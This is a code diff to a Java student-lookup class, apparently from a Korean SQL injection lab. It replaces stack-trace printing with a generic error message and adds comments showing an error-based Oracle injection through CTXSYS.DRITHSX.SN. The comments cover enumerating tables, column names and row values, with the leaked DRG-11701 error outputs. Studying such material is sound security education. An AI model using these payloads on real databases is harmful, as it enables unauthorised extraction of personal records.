@@ -47,22 +47,45 @@ public class StudentInjectMain {
 				System.out.format("%-10s\t %-20s\t %6d \n",stdNo, stdName, stdYear);
 			}
 		}catch(Exception e) {
-			e.printStackTrace();
+			//e.printStackTrace(); // 로그용으로 구성
+			// 페이지인 경우에는 에러 페이지가 전송되도록 구성
+			System.out.println("잘못된 구문이 입력되었습니다.");
 		}
 	}
 }
 
+//  ' or CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables))=1 --
+//  ' or CTXSYS.DRITHSX.SN(user,(select table_name from (select table_name, ROWNUM AS RNUM FROM user_tables) where RNUM=1))=1 --
+//  ' or CTXSYS.DRITHSX.SN(user,(select table_name from (select table_name, ROWNUM AS RNUM FROM user_tables) where RNUM=2))=1 --
 
+//  컬럼 수 확인 
+// ' or CTXSYS.DRITHSX.SN(user,(select count(column_name) from user_tab_columns where table_name='STUDENT'))=1 --
 
+// ' or CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, ROWNUM AS RNUM FROM user_tab_columns where table_name='STUDENT') where RNUM=1))=1 --
+// DRG-11701: STDNO 키워드 사전이 존재하지 않습니다 - 첫번째 컬럼명 탈취
+// 	DRG-11701: STDNAME 키워드 사전이 존재하지 않습니다 -  두번째 컬럼명 탈취
+// DRG-11701: STDYEAR 키워드 사전이 존재하지 않습니다 -  세번째 컬럼명 탈취
+// DRG-11701: STDADDRESS 키워드 사전이 존재하지 않습니다 - 네번째 컬럼명 탈취
+// DRG-11701: STDBIRTH 키워드 사전이 존재하지 않습니다 - 다섯번째 컬럼명 탈취
+// DRG-11701: DPTNO 키워드 사전이 존재하지 않습니다 - 여섯번째 컬럼명 탈취
 
+// 데이터 수 확인
+// ' or CTXSYS.DRITHSX.SN(user,(select count(*) from STUDENT))=1 --
 
+// ' or CTXSYS.DRITHSX.SN(user,(select STDNO from (select STDNO, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
+// DRG-11701: 2023001 키워드 사전이 존재하지 않습니다 - STDNO의 첫번째 데이터 탈취
 
+// ' or CTXSYS.DRITHSX.SN(user,(select STDNAME from (select STDNAME, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
+// DRG-11701: 홍길동 키워드 사전이 존재하지 않습니다 - STDNAME의 첫번째 데이터 탈취
 
+// ' or CTXSYS.DRITHSX.SN(user,(select STDYEAR from (select STDYEAR, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
+// DRG-11701: 3 키워드 사전이 존재하지 않습니다 - STDYEAR의 첫번째 데이터 탈취
 
+//  ' or CTXSYS.DRITHSX.SN(user,(select STDADDRESS from (select STDADDRESS, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
+// DRG-11701: 서울시 키워드 사전이 존재하지 않습니다
 
+// ' or CTXSYS.DRITHSX.SN(user,(select STDBIRTH from (select STDBIRTH, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
+// DRG-11701: 99/01/01 키워드 사전이 존재하지 않습니다
 
-
-
-
-
-
+// ' or CTXSYS.DRITHSX.SN(user,(select DPTNO from (select DPTNO, ROWNUM AS RNUM FROM STUDENT) where RNUM=1))=1 --
+// DRG-11701: 002 키워드 사전이 존재하지 않습니다
